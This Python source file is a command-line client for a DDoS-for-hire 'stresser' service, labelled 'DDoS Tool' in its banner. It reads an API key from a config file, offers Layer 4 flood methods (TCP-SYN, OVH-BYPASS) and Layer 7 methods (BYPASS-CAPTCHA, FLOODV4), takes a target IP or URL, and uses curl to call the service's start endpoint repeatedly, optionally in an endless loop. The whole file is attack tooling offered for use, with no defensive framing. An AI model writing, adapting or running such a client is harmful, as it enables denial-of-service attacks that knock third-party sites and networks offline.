import os
import json
import urllib.parse
import subprocess
import time
from termcolor import colored
from datetime import datetime


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def load_config():
    with open("config.json") as f:
        config = json.load(f)
    return config["api-key"], config["user-id"]


def display_stresser_start():
    print(colored("Starting stresser tool.", "red", attrs=["bold"]))


def execute_curl(url, target, method):
    subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    current_time = datetime.now().strftime("%H:%M:%S")
    print(colored(current_time, "yellow"), colored(f"{target} - {method}", "red"))


# Layer 4
def layer4(api, userid, target, method, port, btime, concurrents, loop, repeats):
    url = f"https://L7nexus.cc/v2/start?api_key={api}&user={userid}&target={target}&time={btime}&method={method}&port={port}"
    display_stresser_start()
    btime = int(btime)  # Ensure btime is an integer
    if loop:
        while True:
            for _ in range(concurrents):
                execute_curl(url, target, method)
            for i in range(btime, 0, -1):
                print(colored(f"Next round in: {i} seconds", "white"), end="\r")
                time.sleep(1)
    else:
        for _ in range(repeats):
            for _ in range(concurrents):
                execute_curl(url, target, method)
            for i in range(btime, 0, -1):
                print(colored(f"Next round in: {i} seconds", "white"), end="\r")
                time.sleep(1)
    print(
        colored(
            "Attack done. Do you want to start again? (y/n):", "yellow", attrs=["bold"]
        )
    )
    if input().lower() == "y":
        main()
    else:
        exit()


# Layer 7
def layer7(api, userid, target, method, btime, concurrents, loop, repeats):
    url = f"https://L7nexus.cc/v2/start?api_key={api}&user={userid}&target={urllib.parse.quote(target)}&time={btime}&method={method}"
    display_stresser_start()
    btime = int(btime)
    if loop:
        while True:
            for _ in range(concurrents):
                execute_curl(url, target, method)
            for i in range(btime, 0, -1):
                print(colored(f"Next round in: {i} seconds", "white"), end="\r")
                time.sleep(1)
    else:
        for _ in range(repeats):
            for _ in range(concurrents):
                execute_curl(url, target, method)
            for i in range(btime, 0, -1):
                print(colored(f"Next round in: {i} seconds", "white"), end="\r")
                time.sleep(1)
    print(
        colored(
            "Attack done. Do you want to start again? (y/n):", "yellow", attrs=["bold"]
        )
    )
    if input().lower() == "y":
        main()
    else:
        exit()


def main():
    clear_screen()

    ascii_art = """
▓█████▄ ▓█████▄  ▒█████    ██████    ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
   ░       ░        ░ ░        ░                  ░ ░      ░ ░      ░  ░
 ░       ░                    Client for L7Nexus | v1.0 | by @hashtagtodo 
"""
    print(colored(ascii_art, "red"))

    api, userid = load_config()

    print(colored(f"Config: User ID: {userid} | API KEY: {api}", "blue"))
    print("Stresser Method:")
    print(colored("[1]", "yellow"), colored("Layer 4 (Attack IP)", "blue"))
    print(colored("[2]", "yellow"), colored("Layer 7 (Attack URL)", "blue"))

    choice = input().strip()

    if choice == "1":
        layer = "4"
        print(colored("Select a Method:", "blue"))
        layer4_methods = [
            "DNS",
            "TCP-ACK",
            "TCP-SYN",
            "TCP-KILL",
            "OVH-BYPASS",
            "TFO",
            "ARD",
            "GRD",
            "PPSV2",
        ]
        for i, method in enumerate(layer4_methods):
            print(colored(f"[{i}]", "yellow"), colored(method, "blue"))

        method_index = int(input().strip())
        method = layer4_methods[method_index]

        print(colored("Target IP:", "blue"))
        target = input().strip()

        print(colored("Port:", "blue"))
        port = input().strip()

        print(colored("Boot time (secs):", "blue"))
        btime = input().strip()

        print(colored("Concurrents:", "blue"))
        concurrents = int(input().strip())

        print(colored("Run in an infinite loop?", "blue"), colored("(y/n):", "white"))
        loop = 1 if input().strip().lower() == "y" else 0

        if not loop:
            print(colored("How many times do you want to repeat the attack?:", "blue"))
            repeats = int(input().strip())
        else:
            repeats = 1

        layer4(api, userid, target, method, port, btime, concurrents, loop, repeats)

    elif choice == "2":
        layer = "7"
        print(colored("Select a Method:", "blue"))
        layer7_methods = [
            "HTTP-RESET",
            "STORM-BYPASS",
            "BROWSER-NEX",
            "BYPASS-CAPTCHA",
            "FLOODV4",
        ]
        for i, method in enumerate(layer7_methods):
            print(colored(f"[{i}]", "yellow"), colored(method, "blue"))

        method_index = int(input().strip())
        method = layer7_methods[method_index]

        print(colored("Target URL:", "blue"))
        target = input().strip()

        print(colored("Boot time (secs):", "blue"))
        btime = input().strip()

        print(colored("Concurrents:", "blue"))
        concurrents = int(input().strip())

        print(colored("Run in an infinite loop?", "blue"), colored("(y/n):", "white"))
        loop = 1 if input().strip().lower() == "y" else 0

        if not loop:
            print(colored("How many times do you want to repeat the attack?:", "blue"))
            repeats = int(input().strip())
        else:
            repeats = 1

        layer7(api, userid, target, method, btime, concurrents, loop, repeats)


if __name__ == "__main__":
    main()
